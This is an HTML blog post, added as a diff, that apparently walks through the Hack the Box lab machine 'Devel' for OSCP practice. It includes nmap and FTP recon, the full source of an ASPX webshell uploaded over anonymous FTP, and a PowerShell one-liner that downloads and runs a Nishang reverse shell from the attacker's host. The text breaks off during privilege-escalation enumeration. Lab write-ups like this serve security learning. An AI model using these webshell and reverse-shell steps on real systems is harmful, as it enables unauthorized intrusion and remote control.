@@ -1,0 +1,554 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="LogistyxCat, Blog of a security student.">
+
+        <link rel="alternate"  href="https://logistyxcat.github.io/feeds/all.atom.xml" type="application/atom+xml" title="LogistyxCat Full Atom Feed"/>
+
+        <title>Devel - Hack the Box // LogistyxCat // Blog of a security student.</title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="./theme/css/pure.css">
+    <link rel="stylesheet" href="./theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="./author/riley.html" title="See posts by Riley">
+                </a>
+                <h2 class="article-info">Riley</h2>
+                <small class="about-author"></small>
+                <h5>Published</h5>
+                <p>Thu 20 February 2020</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>Devel - Hack the Box</h1>
+                        <p class="post-meta">
+                            // under                                 <a class="post-category" href="./tag/ctf.html">ctf</a>
+                                <a class="post-category" href="./tag/hack-the-box.html">hack the box</a>
+                                <a class="post-category" href="./tag/oscp-prep.html">oscp prep</a>
+                        </p>
+                </header>
+            </section>
+            <h2>Description</h2>
+<p>Devel is a neat box that hosts a file server in the same directory that hosts a webserver, which allows anonymous uploads.  After uploading an aspx shell, the Windows 7 host is severely unpatched and likely has several kernel exploits available to use.</p>
+<p>I also go over how to utilize Git to revert and explore old codebases, and compile the C# tool Watson.</p>
+<p>Devel is assigned IP 10.10.10.5.</p>
+<h2>Reconnaissance</h2>
+<p>We begin by initiating an Nmap scan.</p>
+<h4>Nmap</h4>
+<div class="highlight"><pre><span></span><span class="c1"># nmap -sC -sV -oA nmap/Devel 10.10.10.5</span>
+Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.5
+Host is up <span class="o">(</span><span class="m">0</span>.091s latency<span class="o">)</span>.
+Not shown: <span class="m">998</span> filtered ports
+PORT   STATE SERVICE VERSION
+<span class="m">21</span>/tcp open  ftp     Microsoft ftpd
+<span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code <span class="m">230</span><span class="o">)</span>
+<span class="p">|</span> <span class="m">03</span>-18-17  <span class="m">01</span>:06AM       &lt;DIR&gt;          aspnet_client
+<span class="p">|</span> <span class="m">03</span>-17-17  <span class="m">04</span>:37PM                  <span class="m">689</span> iisstart.htm
+<span class="p">|</span>_03-17-17  <span class="m">04</span>:37PM               <span class="m">184946</span> welcome.png
+<span class="p">|</span> ftp-syst: 
+<span class="p">|</span>_  SYST: Windows_NT
+<span class="m">80</span>/tcp open  http    Microsoft IIS httpd <span class="m">7</span>.5
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Potentially risky methods: TRACE
+<span class="p">|</span>_http-server-header: Microsoft-IIS/7.5
+<span class="p">|</span>_http-title: IIS7
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</pre></div>
+
+
+<p>The only services that appear to be available are HTTP (80) and FTP (21), the latter having anonymous logins enabled.  The FTP server may be rooted to the same directory as the webserver; since we can log in anonymously, we should be able to download the files and verify this.</p>
+<h3>Examining FTP access</h3>
+<p>In order to log in to FTP, we need to use the username <strong>anonymous</strong>, but the password can be anything -- even blank.</p>
+<h4>Anonymous FTP login</h4>
+<div class="highlight"><pre><span></span><span class="c1"># ftp 10.10.10.5</span>
+Connected to <span class="m">10</span>.10.10.5.
+<span class="m">220</span> Microsoft FTP Service
+Name <span class="o">(</span><span class="m">10</span>.10.10.5:root<span class="o">)</span>: anonymous
+<span class="m">331</span> Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
+Password: whateva
+<span class="m">230</span> User logged in.
+Remote system <span class="nb">type</span> is Windows_NT.
+ftp&gt; dir
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+<span class="m">03</span>-18-17  <span class="m">01</span>:06AM       &lt;DIR&gt;          aspnet_client
+<span class="m">03</span>-17-17  <span class="m">04</span>:37PM                  <span class="m">689</span> iisstart.htm
+<span class="m">03</span>-17-17  <span class="m">04</span>:37PM               <span class="m">184946</span> welcome.png
+<span class="m">226</span> Transfer complete.
+</pre></div>
+
+
+<p>So we can access the FTP server content.  How about the website?</p>
+<p><img alt="Navigated to 10.10.10.5 in Firefox" src="images/ctf/htb/devel/http_80_web_root.png"></p>
+<p>To verify this is the same directory as FTP, we can look at the <code>iisstart.htm</code> from FTP and the website source in Firefox for a cross-comparison.</p>
+<h4>Downloading iisstart.htm from FTP server</h4>
+<div class="highlight"><pre><span></span>ftp&gt; get iisstart.htm
+local: iisstart.htm remote: iisstart.htm
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">150</span> Opening ASCII mode data connection.
+<span class="m">226</span> Transfer complete.
+<span class="m">689</span> bytes received in <span class="m">0</span>.09 secs <span class="o">(</span><span class="m">7</span>.3856 kB/s<span class="o">)</span>
+</pre></div>
+
+
+<p>The file will download to localhost at your <code>pwd</code>.  Taking a look at the contents:</p>
+<h4>cat iisstart.htm</h4>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">&quot;http://www.w3.org/1999/xhtml&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;Content-Type&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;text/html; charset=iso-8859-1&quot;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>IIS7<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">style</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/css&quot;</span><span class="p">&gt;</span>
+<span class="o">&lt;!</span><span class="nt">--</span>
+<span class="nt">body</span> <span class="p">{</span>
+        <span class="k">color</span><span class="p">:</span><span class="mh">#000000</span><span class="p">;</span>
+        <span class="k">background-color</span><span class="p">:</span><span class="mh">#B3B3B3</span><span class="p">;</span>
+        <span class="k">margin</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="p">#</span><span class="nn">container</span> <span class="p">{</span>
+        <span class="k">margin-left</span><span class="p">:</span><span class="kc">auto</span><span class="p">;</span>
+        <span class="k">margin-right</span><span class="p">:</span><span class="kc">auto</span><span class="p">;</span>
+        <span class="k">text-align</span><span class="p">:</span><span class="kc">center</span><span class="p">;</span>
+        <span class="p">}</span>
+
+<span class="nt">a</span> <span class="nt">img</span> <span class="p">{</span>
+        <span class="k">border</span><span class="p">:</span><span class="kc">none</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nt">--</span><span class="o">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;container&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;http://go.microsoft.com/fwlink/?linkid=66138&amp;amp;clcid=0x409&quot;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;welcome.png&quot;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&quot;IIS7&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;571&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;411&quot;</span> <span class="p">/&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+
+
+<p>Back in Firefox, the source appears to be the same.
+<img alt="Same HTML code" src="images/ctf/htb/devel/http_80_web_root_source.png"></p>
+<p>So it's either the same directory or a source code repository; there isn't a good way to determine without some modifications to the content.  For this, we could try uploading our own files.</p>
+<p>FTP provides functionality to both upload and download files.  We can locate a webshell and try uploading from there.</p>
+<p>Kali Linux has basic webshells shipped by default in <code>/usr/share/webshells/</code>; I don't know what software the server hosts at this time (ASP.NET, PHP, etc.), so it's possible that multiple shells will need to be tested.  We will try the <code>/usr/share/webshells/aspx/cmdasp.aspx</code> shell to start.</p>
+<p>This is the source code for the shell:</p>
+<h4>cat /usr/share/webshells/aspx/cmdasp.aspx</h4>
+<div class="highlight"><pre><span></span><span class="cp">&lt;%</span><span class="err">@</span> <span class="no">Page</span> <span class="no">Language</span><span class="o">=</span><span class="s2">&quot;C#&quot;</span> <span class="no">Debug</span><span class="o">=</span><span class="s2">&quot;true&quot;</span> <span class="no">Trace</span><span class="o">=</span><span class="s2">&quot;false&quot;</span> <span class="cp">%&gt;</span>
+<span class="cp">&lt;%</span><span class="err">@</span> <span class="no">Import</span> <span class="no">Namespace</span><span class="o">=</span><span class="s2">&quot;System.Diagnostics&quot;</span> <span class="cp">%&gt;</span>
+<span class="cp">&lt;%</span><span class="err">@</span> <span class="no">Import</span> <span class="no">Namespace</span><span class="o">=</span><span class="s2">&quot;System.IO&quot;</span> <span class="cp">%&gt;</span>
+<span class="nt">&lt;script</span> <span class="na">Language=</span><span class="s">&quot;c#&quot;</span> <span class="na">runat=</span><span class="s">&quot;server&quot;</span><span class="nt">&gt;</span>
+void Page_Load(object sender, EventArgs e)
+{
+}
+string ExcuteCmd(string arg)
+{
+ProcessStartInfo psi = new ProcessStartInfo();
+psi.FileName = &quot;cmd.exe&quot;;
+psi.Arguments = &quot;/c &quot;+arg;
+psi.RedirectStandardOutput = true;
+psi.UseShellExecute = false;
+Process p = Process.Start(psi);
+StreamReader stmrdr = p.StandardOutput;
+string s = stmrdr.ReadToEnd();
+stmrdr.Close();
+return s;
+}
+void cmdExe_Click(object sender, System.EventArgs e)
+{
+Response.Write(&quot;<span class="nt">&lt;pre&gt;</span>&quot;);
+Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
+Response.Write(&quot;<span class="nt">&lt;/pre&gt;</span>&quot;);
+}
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;HTML&gt;</span>
+<span class="nt">&lt;HEAD&gt;</span>
+<span class="nt">&lt;title&gt;</span>awen asp.net webshell<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/HEAD&gt;</span>
+<span class="nt">&lt;body</span> <span class="nt">&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">&quot;cmd&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">runat=</span><span class="s">&quot;server&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;asp:TextBox</span> <span class="na">id=</span><span class="s">&quot;txtArg&quot;</span> <span class="na">style=</span><span class="s">&quot;Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px&quot;</span> <span class="na">runat=</span><span class="s">&quot;server&quot;</span> <span class="na">Width=</span><span class="s">&quot;250px&quot;</span><span class="nt">&gt;&lt;/asp:TextBox&gt;</span>
+<span class="nt">&lt;asp:Button</span> <span class="na">id=</span><span class="s">&quot;testing&quot;</span> <span class="na">style=</span><span class="s">&quot;Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px&quot;</span> <span class="na">runat=</span><span class="s">&quot;server&quot;</span> <span class="na">Text=</span><span class="s">&quot;excute&quot;</span> <span class="na">OnClick=</span><span class="s">&quot;cmdExe_Click&quot;</span><span class="nt">&gt;&lt;/asp:Button&gt;</span>
+<span class="nt">&lt;asp:Label</span> <span class="na">id=</span><span class="s">&quot;lblText&quot;</span> <span class="na">style=</span><span class="s">&quot;Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px&quot;</span> <span class="na">runat=</span><span class="s">&quot;server&quot;</span><span class="nt">&gt;</span>Command:<span class="nt">&lt;/asp:Label&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/HTML&gt;</span>
+
+<span class="c">&lt;!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) --&gt;</span>
+<span class="c">&lt;!--    http://michaeldaw.org   04/2007    --&gt;</span>
+</pre></div>
+
+
+<p>The webshell will:</p>
+<ol>
+<li>Take in input using a website form</li>
+<li>Run the input through <code>cmd /c</code> to execute on the server</li>
+<li>Return the output of the command</li>
+</ol>
+<p>This sort of shell would be a perfect test.</p>
+<p><em>Note: A few quick edits can alter this to run PowerShell commands if that is preferable.  I've included instructions at the bottom of this guide.</em></p>
+<h2>Nobody -&gt; Web: Anonymous FTP upload to webshell execution</h2>
+<p>To start, let's copy this into our current directory.</p>
+<div class="highlight"><pre><span></span><span class="c1"># cp /usr/share/webshells/aspx/cmdasp.aspx ./ttbcmd.aspx</span>
+</pre></div>
+
+
+<p>We can use the FTP <code>put</code> command to upload it:</p>
+<div class="highlight"><pre><span></span>ftp&gt; put ttbcmd.aspx
+local: ttbcmd.aspx remote: ttbcmd.aspx
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+<span class="m">226</span> Transfer complete.
+<span class="m">1442</span> bytes sent in <span class="m">0</span>.00 secs <span class="o">(</span><span class="m">55</span>.0079 MB/s<span class="o">)</span>
+ftp&gt; dir
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+<span class="m">03</span>-18-17  <span class="m">01</span>:06AM       &lt;DIR&gt;          aspnet_client
+<span class="m">03</span>-17-17  <span class="m">04</span>:37PM                  <span class="m">689</span> iisstart.htm
+<span class="m">02</span>-21-20  <span class="m">07</span>:05AM                 <span class="m">1442</span> ttbcmd.aspx
+<span class="m">03</span>-17-17  <span class="m">04</span>:37PM               <span class="m">184946</span> welcome.png
+<span class="m">226</span> Transfer complete.
+</pre></div>
+
+
+<p>That looks to have uploaded correctly.  We can try navigating to our webshell with curl or a browser to see if we can get remote execution.</p>
+<p><img alt="Webshell access confirmed" src="images/ctf/htb/devel/http_80_webshell.png"></p>
+<p>That the website rendered this new page is a good indicator that the server utilises ASP.NET content (and can thus execute C# code) and that the FTP server is set to the same directory as the IIS server.</p>
+<p>Attempting to execute a command also provides good feedback.</p>
+<p><img alt="Good news, everyone!" src="images/ctf/htb/devel/http_80_webshell_cmd-exec.png"></p>
+<h3>Nishang Reverse TCP Shell</h3>
+<p><a href="https://github.com/samratashok/nishang">Nishang</a> provides several useful scripts and functions, including <code>Invoke-PowerShellTcp.ps1</code>.  This script creates a reverse shell using a TCP stream. </p>
+<p>Clone the Nishang Github repository and collect the desired shell script:</p>
+<div class="highlight"><pre><span></span><span class="c1"># git clone -C /opt https://github.com/samratashok/nishang</span>
+Cloning into <span class="s1">&#39;nishang&#39;</span>...
+remote: Enumerating objects: <span class="m">10</span>, <span class="k">done</span>.
+remote: Counting objects: <span class="m">100</span>% <span class="o">(</span><span class="m">10</span>/10<span class="o">)</span>, <span class="k">done</span>.
+remote: Compressing objects: <span class="m">100</span>% <span class="o">(</span><span class="m">8</span>/8<span class="o">)</span>, <span class="k">done</span>.
+remote: Total <span class="m">1686</span> <span class="o">(</span>delta <span class="m">2</span><span class="o">)</span>, reused <span class="m">6</span> <span class="o">(</span>delta <span class="m">2</span><span class="o">)</span>, pack-reused <span class="m">1676</span>
+Receiving objects: <span class="m">100</span>% <span class="o">(</span><span class="m">1686</span>/1686<span class="o">)</span>, <span class="m">8</span>.88 MiB <span class="p">|</span> <span class="m">10</span>.48 MiB/s, <span class="k">done</span>.
+Resolving deltas: <span class="m">100</span>% <span class="o">(</span><span class="m">1053</span>/1053<span class="o">)</span>, <span class="k">done</span>.
+<span class="c1"># cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 ./</span>
+<span class="c1"># python3 -m http.server 80</span>
+</pre></div>
+
+
+<p>We will need to append a new line to the very bottom of the file to automatically execute the desired command:</p>
+<div class="highlight"><pre><span></span><span class="c1"># echo -n &quot;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.22 -Port 443&quot; &gt;&gt; InvokePowerShellTcp.ps1</span>
+</pre></div>
+
+
+<p>We also need to set up a listener on Kali:</p>
+<div class="highlight"><pre><span></span><span class="c1"># rlwrap ncat -nvlp 443</span>
+Ncat: Version <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::443
+Ncat: Listening on <span class="m">0</span>.0.0.0:443
+</pre></div>
+
+
+<p>Back on the webshell, we execute one-liner to download and execute the PS script:</p>
+<div class="highlight"><pre><span></span><span class="n">powershell</span> <span class="n">iex</span><span class="p">(</span><span class="nb">new-object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.22/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">)</span>
+</pre></div>
+
+
+<p>And we receive a callback from Devel!</p>
+<div class="highlight"><pre><span></span><span class="n">Ncat</span><span class="err">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">5</span><span class="p">.</span>
+<span class="n">Ncat</span><span class="err">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">5</span><span class="err">:</span><span class="n">49163</span><span class="p">.</span>
+<span class="n">Windows</span> <span class="n">PowerShell</span> <span class="n">running</span> <span class="n">as</span> <span class="n">user</span> <span class="n">DEVEL</span><span class="p">$</span> <span class="n">on</span> <span class="n">DEVEL</span>
+<span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="n">2015</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+
+<span class="nb">PS </span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">&gt;</span><span class="n">whoami</span><span class="p">;</span> <span class="n">hostname</span>
+<span class="n">iis</span> <span class="n">apppool</span><span class="p">\</span><span class="n">web</span>
+<span class="n">devel</span>
+</pre></div>
+
+
+<p>Excellent, now we have a good PS shell. </p>
+<h2>Server-side Enumeration</h2>
+<p>A good place to start with local enumeration on Windows is to determine OS version and other system information.  The built in <code>systeminfo</code> command will give us all this and more.</p>
+<h4>systeminfo</h4>
+<div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">&gt;</span> <span class="n">systeminfo</span>
+
+<span class="n">Host</span> <span class="n">Name</span><span class="err">:</span>                 <span class="n">DEVEL</span>
+<span class="n">OS</span> <span class="n">Name</span><span class="err">:</span>                   <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">7</span> <span class="n">Enterprise</span> 
+<span class="n">OS</span> <span class="n">Version</span><span class="err">:</span>                <span class="n">6</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">7600</span> <span class="n">N</span><span class="p">/</span><span class="n">A</span> <span class="n">Build</span> <span class="n">7600</span>
+<span class="n">OS</span> <span class="n">Manufacturer</span><span class="err">:</span>           <span class="n">Microsoft</span> <span class="n">Corporation</span>
+<span class="n">OS</span> <span class="n">Configuration</span><span class="err">:</span>          <span class="n">Standalone</span> <span class="n">Workstation</span>
+<span class="n">OS</span> <span class="n">Build</span> <span class="n">Type</span><span class="err">:</span>             <span class="n">Multiprocessor</span> <span class="n">Free</span>
+<span class="n">Registered</span> <span class="n">Owner</span><span class="err">:</span>          <span class="n">babis</span>
+<span class="n">Registered</span> <span class="n">Organization</span><span class="err">:</span>   
+<span class="n">Product</span> <span class="n">ID</span><span class="err">:</span>                <span class="n">55041</span><span class="p">-</span><span class="n">051</span><span class="p">-</span><span class="n">0948536</span><span class="p">-</span><span class="n">86302</span>
+<span class="n">Original</span> <span class="n">Install</span> <span class="n">Date</span><span class="err">:</span>     <span class="n">17</span><span class="p">/</span><span class="n">3</span><span class="p">/</span><span class="n">2017</span><span class="p">,</span> <span class="n">4</span><span class="err">:</span><span class="n">17</span><span class="err">:</span><span class="n">31</span> <span class="p">??</span>
+<span class="n">System</span> <span class="n">Boot</span> <span class="n">Time</span><span class="err">:</span>          <span class="n">21</span><span class="p">/</span><span class="n">2</span><span class="p">/</span><span class="n">2020</span><span class="p">,</span> <span class="n">6</span><span class="err">:</span><span class="n">00</span><span class="err">:</span><span class="n">15</span> <span class="p">??</span>
+<span class="n">System</span> <span class="n">Manufacturer</span><span class="err">:</span>       <span class="n">VMware</span><span class="p">,</span> <span class="n">Inc</span><span class="p">.</span>
+<span class="n">System</span> <span class="n">Model</span><span class="err">:</span>              <span class="n">VMware</span> <span class="n">Virtual</span> <span class="n">Platform</span>
+<span class="n">System</span> <span class="n">Type</span><span class="err">:</span>               <span class="n">X86-based</span> <span class="n">PC</span>
+<span class="n">Processor</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="err">:</span>              <span class="n">1</span> <span class="n">Processor</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">Installed</span><span class="p">.</span>
+                           <span class="p">[</span><span class="n">01</span><span class="p">]</span><span class="err">:</span> <span class="n">x64</span> <span class="n">Family</span> <span class="n">23</span> <span class="n">Model</span> <span class="n">1</span> <span class="n">Stepping</span> <span class="n">2</span> <span class="n">AuthenticAMD</span> <span class="p">~</span><span class="n">2000</span> <span class="n">Mhz</span>
+<span class="n">BIOS</span> <span class="n">Version</span><span class="err">:</span>              <span class="n">Phoenix</span> <span class="n">Technologies</span> <span class="n">LTD</span> <span class="n">6</span><span class="p">.</span><span class="n">00</span><span class="p">,</span> <span class="n">12</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">2018</span>
+<span class="n">Windows</span> <span class="n">Directory</span><span class="err">:</span>         <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Windows</span>
+<span class="n">System</span> <span class="n">Directory</span><span class="err">:</span>          <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span>
+<span class="n">Boot</span> <span class="n">Device</span><span class="err">:</span>               <span class="p">\</span><span class="n">Device</span><span class="p">\</span><span class="n">HarddiskVolume1</span>
+<span class="n">System</span> <span class="n">Locale</span><span class="err">:</span>             <span class="n">el</span><span class="p">;</span><span class="n">Greek</span>
+<span class="n">Input</span> <span class="n">Locale</span><span class="err">:</span>              <span class="n">en-us</span><span class="p">;</span><span class="n">English</span> <span class="p">(</span><span class="n">United</span> <span class="n">States</span><span class="p">)</span>
+<span class="n">Time</span> <span class="n">Zone</span><span class="err">:</span>                 <span class="p">(</span><span class="n">UTC</span><span class="p">+</span><span class="n">02</span><span class="err">:</span><span class="n">00</span><span class="p">)</span> <span class="n">Athens</span><span class="p">,</span> <span class="n">Bucharest</span><span class="p">,</span> <span class="n">Istanbul</span>
+<span class="n">Total</span> <span class="n">Physical</span> <span class="n">Memory</span><span class="err">:</span>     <span class="n">1</span><span class="p">.</span><span class="n">023</span> <span class="n">MB</span>
+<span class="n">Available</span> <span class="n">Physical</span> <span class="n">Memory</span><span class="err">:</span> <span class="n">708</span> <span class="n">MB</span>
+<span class="n">Virtual</span> <span class="n">Memory</span><span class="err">:</span> <span class="n">Max</span> <span class="n">Size</span><span class="err">:</span>  <span class="n">2</span><span class="p">.</span><span class="n">047</span> <span class="n">MB</span>
+<span class="n">Virtual</span> <span class="n">Memory</span><span class="err">:</span> <span class="n">Available</span><span class="err">:</span> <span class="n">1</span><span class="p">.</span><span class="n">493</span> <span class="n">MB</span>
+<span class="n">Virtual</span> <span class="n">Memory</span><span class="err">:</span> <span class="k">In</span> <span class="n">Use</span><span class="err">:</span>    <span class="n">554</span> <span class="n">MB</span>
+<span class="n">Page</span> <span class="n">File</span> <span class="n">Location</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="err">:</span>     <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">pagefile</span><span class="p">.</span><span class="n">sys</span>
+<span class="n">Domain</span><span class="err">:</span>                    <span class="n">HTB</span>
+<span class="n">Logon</span> <span class="n">Server</span><span class="err">:</span>              <span class="n">N</span><span class="p">/</span><span class="n">A</span>
+<span class="n">Hotfix</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="err">:</span>                 <span class="n">N</span><span class="p">/</span><span class="n">A</span>
+<span class="n">Network</span> <span class="n">Card</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="err">:</span>           <span class="n">1</span> <span class="n">NIC</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">Installed</span><span class="p">.</span>
+                           <span class="p">[</span><span class="n">01</span><span class="p">]</span><span class="err">:</span> <span class="n">Intel</span><span class="p">(</span><span class="n">R</span><span class="p">)</span> <span class="n">PRO</span><span class="p">/</span><span class="n">1000</span> <span class="n">MT</span> <span class="n">Network</span> <span class="n">Connection</span>
+                                 <span class="n">Connection</span> <span class="n">Name</span><span class="err">:</span> <span class="n">Local</span> <span class="n">Area</span> <span class="n">Connection</span>
+                                 <span class="n">DHCP</span> <span class="n">Enabled</span><span class="err">:</span>    <span class="n">No</span>
+                                 <span class="n">IP</span> <span class="n">address</span><span class="p">(</span><span class="n">es</span><span class="p">)</span>
+                                 <span class="p">[</span><span class="n">01</span><span class="p">]</span><span class="err">:</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">5</span>
+</pre></div>
+
+
+<p>Based on the <code>Hotfix(s)</code> field, this system may not be patched at all!  There are a number of kernel exploits that may apply in this Scenario.  <a href="https://github.com/rasta-mouse/Watson">Watson</a> is a C# tool created by <a href="https://twitter.com/_rastamouse">@RastaMouse</a> to identify possible Windows exploits for privilege escalation.</p>
+<h3>Compiling Watson</h3>
+<p>The only issue with using Watson now is that as of v2.0 it only supports Windows 10 versions; this wasn't always the case.  To use it on Windows 7, we will need to utilize an older version of the software.  We can use Gits built-in commit history functionality using the <code>checkout</code> function to get the older v0.1 (Win7 compatible) code.</p>
+<p>To compile the requisite binary, I installed Visual Studio Community (with all C# functionality) and Git on a Windows 10 machine and cloned the Github  repository.</p>
+<p><img alt="" src="images/ctf/htb/devel/watson_clone_repo-1.png"></p>
+<p><img alt="" src="images/ctf/htb/devel/watson_clone_repo-2.png"></p>
+<p>Then, under <strong>Team Explorer</strong> on the bottom right, there is a list of Local Git Repositories (I have two other projects cloned).  Right click Watson and select <strong>Open Command Prompt</strong>.</p>
+<p><img alt="" src="images/ctf/htb/devel/watson_checkout-1.png"></p>
+<p>The last version of Watson that was compatible with other editions of Windows is commit <strong>486ff207270e4f4cadc94ddebfce1121ae7b5437</strong>.  To get this version, run <code>git checkout 486ff207270e4f4cadc94ddebfce1121ae7b5437</code> in the command prompt.</p>
+<p><img alt="" src="images/ctf/htb/devel/watson_checkout-2.png"></p>
+<p>Now we need the target .NET version.  This can be almost any version isntalled on the machine, but we should know what's available before compiling.</p>
+<p>Available .NET Framework versions should be listed in <code>C:\Windows\Microsoft.NET\Framework\</code>.</p>
+<h4>Back on Devel...</h4>
+<div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">gci </span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework</span><span class="p">\</span><span class="n">v</span><span class="p">*</span>
+
+
+    <span class="n">Directory</span><span class="err">:</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework</span>
+
+
